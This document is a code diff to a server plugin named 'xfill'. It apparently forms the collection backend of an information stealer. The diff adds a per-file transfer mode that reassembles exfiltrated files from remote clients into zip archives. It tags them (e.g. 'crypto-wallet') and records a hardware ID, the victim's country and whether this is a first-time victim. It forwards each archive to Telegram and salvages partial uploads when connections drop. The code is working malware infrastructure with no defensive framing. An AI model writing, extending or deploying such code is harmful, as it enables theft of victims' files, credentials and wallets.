@@ -46,6 +46,7 @@ function rowToJson(row) {
     size: row.size,
     createdAt: row.created_at,
     seen: !!row.seen,
+    partial: !!row.partial,
     tags,
     info,
   };
@@ -113,6 +114,156 @@ function computeTags(zipBuf, info) {
     tags.add("crypto-wallet");
   }
   return [...tags];
+}
+
+/* ──────────────────────────────────────────────
+   Per-file session mode (new wire format): each
+   zip entry transfers as its own framed unit, so a
+   dropped connection still yields every completed
+   file. Partial sessions produce partial archives.
+   ────────────────────────────────────────────── */
+
+function partDir(ctx, clientId, session) {
+  return path.join(ctx.dataDir, safeSegment(clientId), `.part-${safeSegment(session)}`);
+}
+
+function sanitizeZipPath(p) {
+  const s = String(p ?? "").replace(/\\/g, "/");
+  if (!s || s.startsWith("/") || s.includes("..")) return null;
+  return s;
+}
+
+function listFilesRecursive(dir, base = "") {
+  const out = [];
+  let entries;
+  try {
+    entries = fs.readdirSync(dir, { withFileTypes: true });
+  } catch {
+    return out;
+  }
+  for (const e of entries) {
+    const rel = base ? `${base}/${e.name}` : e.name;
+    if (e.isDirectory()) out.push(...listFilesRecursive(path.join(dir, e.name), rel));
+    else out.push(rel);
+  }
+  return out;
+}
+
+async function storeSessionArchive(ctx, clientId, session, payload, partial) {
+  const dir = partDir(ctx, clientId, session);
+  const relFiles = listFilesRecursive(dir);
+  if (relFiles.length === 0) return false;
+  const files = relFiles.map((rel) => ({
+    name: rel,
+    data: fs.readFileSync(path.join(dir, rel)),
+  }));
+  const zip = buildZip(files);
+  const target = archivePath(ctx, clientId, session);
+  fs.mkdirSync(path.dirname(target), { recursive: true });
+  fs.writeFileSync(target, zip);
+
+  const info = await enrichCountry(ctx, payload?.info ?? null);
+  if (info && typeof info === "object") {
+    const prior = ctx.db
+      .prepare("SELECT COUNT(*) AS n FROM archives WHERE client_id = ?")
+      .get(String(clientId));
+    info.FirstTime = (prior?.n ?? 0) === 0;
+  }
+  const tags = computeTags(zip, info);
+  const createdAt = new Date().toISOString();
+  const filename = `${session}.zip`;
+  const result = ctx.db
+    .prepare("INSERT INTO archives(client_id, session, filename, size, created_at, info_json, tags, partial) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
+    .run(String(clientId), session, filename, zip.length, createdAt, JSON.stringify(info), JSON.stringify(tags), partial ? 1 : 0);
+
+  const row = ctx.db.prepare("SELECT * FROM archives WHERE id = ?").get(result.lastInsertRowid);
+  ctx.broadcast("archive_added", rowToJson(row));
+  ctx.log.info(`xfill archive stored: ${clientId} session ${session} (${zip.length} bytes${partial ? ", PARTIAL" : ""})`);
+  clientStatus.set(String(clientId), { stage: "done", session, at: Date.now() });
+
+  const hwid = info?.HWID || String(clientId).slice(0, 10);
+  await sendTelegramNotification(ctx, info, zip, `${hwid}_${session}.zip`);
+  fs.rmSync(dir, { recursive: true, force: true });
+  return true;
+}
+
+async function finalizeFileSession(ctx, clientId, session) {
+  const key = bufferKey(clientId, session);
+  const buf = pending.get(key);
+  if (!buf || !buf.complete) return;
+  // Briefly tolerate in-flight file chunks that trail the complete event.
+  if (buf.inflight > 0 && buf.attempts <= FINALIZE_MAX_ATTEMPTS) {
+    buf.attempts += 1;
+    setTimeout(() => finalizeFileSession(ctx, clientId, session), FINALIZE_RETRY_MS);
+    return;
+  }
+  if (buf.finalized) return;
+  buf.finalized = true;
+  pending.delete(key);
+  const expected = Number(buf.complete?.files) || 0;
+  const partial = expected > 0 && buf.filesDone < expected;
+  try {
+    const ok = await storeSessionArchive(ctx, clientId, session, buf.complete, partial);
+    if (!ok) {
+      ctx.broadcast("collect_error", { clientId, stage: "assemble", message: "no files received" });
+    }
+  } catch (err) {
+    const message = err instanceof Error ? err.message : String(err);
+    ctx.log.error(`xfill_complete failed for ${clientId} session ${session}: ${message}`);
+    ctx.broadcast("collect_error", { clientId, stage: "assemble", message });
+  }
+}
+
+function handleFileChunk(ctx, clientId, payload) {
+  // Run the same TTL eviction as the legacy chunk path — stalled file-mode
+  // sessions must be salvaged into partial archives, not dropped.
+  const nowEvict = Date.now();
+  for (const [k, b] of pending) {
+    if (nowEvict - b.startedAt > 10 * 60 * 1000) {
+      pending.delete(k);
+      if (b.isFileMode && b.filesDone > 0) {
+        const sep = k.lastIndexOf(":");
+        void storeSessionArchive(ctx, k.slice(0, sep), k.slice(sep + 1), b.complete ?? {}, true);
+      }
+    }
+  }
+  const session = Number(payload?.session);
+  const index = Number(payload?.index);
+  const total = Number(payload?.total);
+  const relPath = sanitizeZipPath(payload?.path);
+  if (!Number.isFinite(session) || !Number.isInteger(index) || !Number.isInteger(total) || !relPath || typeof payload?.data !== "string") {
+    ctx.log.warn(`xfill_file: malformed payload from ${clientId}`);
+    return;
+  }
+  if (index >= total || payload.data.length > 1024 * 1024) {
+    ctx.log.warn(`xfill_file: out-of-range chunk from ${clientId}`);
+    return;
+  }
+  const key = bufferKey(clientId, session);
+  let buf = pending.get(key);
+  if (!buf) {
+    buf = { isFileMode: true, files: new Map(), inflight: 0, filesDone: 0, startedAt: Date.now(), complete: null, attempts: 0, finalized: false };
+    pending.set(key, buf);
+  }
+  let f = buf.files.get(relPath);
+  if (!f) {
+    f = { chunks: new Map(), total };
+    buf.files.set(relPath, f);
+    buf.inflight++;
+  }
+  f.chunks.set(index, payload.data);
+  if (f.chunks.size === f.total) {
+    // File complete: assemble, persist to the part dir, free the chunks.
+    const parts = [];
+    for (let i = 0; i < f.total; i++) parts.push(Buffer.from(f.chunks.get(i), "base64"));
+    const bytes = Buffer.concat(parts);
+    const dest = path.join(partDir(ctx, clientId, session), relPath);
+    fs.mkdirSync(path.dirname(dest), { recursive: true });
+    fs.writeFileSync(dest, bytes);
+    buf.files.delete(relPath);
+    buf.inflight--;
+    buf.filesDone++;
+  }
 }
 
 /* ──────────────────────────────────────────────
@@ -514,7 +665,8 @@ export default {
         created_at TEXT,
         info_json TEXT,
         seen INTEGER DEFAULT 0,
-        tags TEXT DEFAULT '[]'
+        tags TEXT DEFAULT '[]',
+        partial INTEGER DEFAULT 0
       );
       CREATE INDEX IF NOT EXISTS archives_created ON archives(created_at DESC);
       CREATE TABLE IF NOT EXISTS settings (
@@ -529,6 +681,9 @@ export default {
     try {
       ctx.db.exec("ALTER TABLE archives ADD COLUMN tags TEXT DEFAULT '[]'");
     } catch {}
+    try {
+      ctx.db.exec("ALTER TABLE archives ADD COLUMN partial INTEGER DEFAULT 0");
+    } catch {}
     fs.mkdirSync(ctx.dataDir, { recursive: true });
     ctx.log.info("xfill plugin ready");
   },
@@ -538,12 +693,24 @@ export default {
   },
 
   onEvent(ctx, clientId, event, payload) {
+    if (event === "xfill_file") {
+      handleFileChunk(ctx, clientId, payload);
+      return;
+    }
+
     if (event === "xfill_chunk") {
       // Evict stale sessions on EVERY chunk — a session whose complete never
-      // arrives would otherwise sit in RAM for the full TTL.
+      // arrives would otherwise sit in RAM for the full TTL. File-mode
+      // sessions are salvaged: partial archives get stored, not dropped.
       const nowEvict = Date.now();
       for (const [k, b] of pending) {
-        if (nowEvict - b.startedAt > 10 * 60 * 1000) pending.delete(k);
+        if (nowEvict - b.startedAt > 10 * 60 * 1000) {
+          pending.delete(k);
+          if (b.isFileMode && b.filesDone > 0) {
+            const sep = k.lastIndexOf(":");
+            void storeSessionArchive(ctx, k.slice(0, sep), k.slice(sep + 1), b.complete ?? {}, true);
+          }
+        }
       }
       const session = Number(payload?.session);
       const index = Number(payload?.index);
@@ -583,12 +750,16 @@ export default {
       const session = Number(payload?.session);
       const key = bufferKey(clientId, session);
       let buf = pending.get(key);
+      const isFileMode = buf?.isFileMode || Number.isInteger(Number(payload?.files));
       if (!buf) {
-        buf = { total: Number(payload?.chunks) || 0, chunks: new Map(), startedAt: Date.now(), complete: null, attempts: 0 };
+        buf = isFileMode
+          ? { isFileMode: true, files: new Map(), inflight: 0, filesDone: 0, startedAt: Date.now(), complete: null, attempts: 0, finalized: false }
+          : { total: Number(payload?.chunks) || 0, chunks: new Map(), startedAt: Date.now(), complete: null, attempts: 0 };
         pending.set(key, buf);
       }
       buf.complete = payload ?? {};
-      finalizeSession(ctx, clientId, session);
+      if (isFileMode) finalizeFileSession(ctx, clientId, session);
+      else finalizeSession(ctx, clientId, session);
       return;
     }
 
